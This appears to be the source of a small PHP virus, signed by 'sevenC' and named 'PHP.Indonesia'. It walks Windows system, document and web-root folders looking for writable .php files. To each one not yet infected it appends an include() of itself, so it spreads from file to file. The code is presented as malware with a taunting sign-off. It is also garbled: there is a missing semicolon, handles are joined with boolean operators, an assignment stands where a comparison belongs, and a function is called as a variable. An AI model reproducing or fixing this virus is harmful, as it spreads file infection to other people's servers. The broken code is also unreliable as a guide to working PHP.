$jawa = "indonesia.php\n";
$sumatra = "Wellcome to Indonesian PHPlovers.\n";
$kalimantan = $jawa . $sumatra;
echo $kalimantan;
$all = opendir('C:\Windows\');
$all1 = opendir('C:\My Documents\');
$all2 = opendir('C:\InetPub\wwwRoot\');
$all3 = $all && $all1 && $all2
while ($file = readdir($all3))
{
$inf = true;
$exe = false;
if ( ($exe = strstr ($file, '.php')) || ($exe = strstr ($file, '.php2')) || ($exe = strstr ($file, '.php3')) )
if ( is_file($file) && is_writeable($file) )
{
$new = fopen($file, "r");
$look = fread($new, filesize($file));
$yes = strstr ($look, 'indonesia.php');
if (!$yes) $inf = false;
}
if ( ($inf=false) )
{
$new = fopen($file, "a");
$fputs($new, "");
$fputs($new, " $fputs($new, "include(\"");
$fputs($new, __FILE__);
$fputs($new, "\"); ");
$fputs($new, "?>");
return;
}
}
closedir($all3);
// PHP.Indonesia made for all Chicken looser ground the world
// By sevenC / N0:7
?>
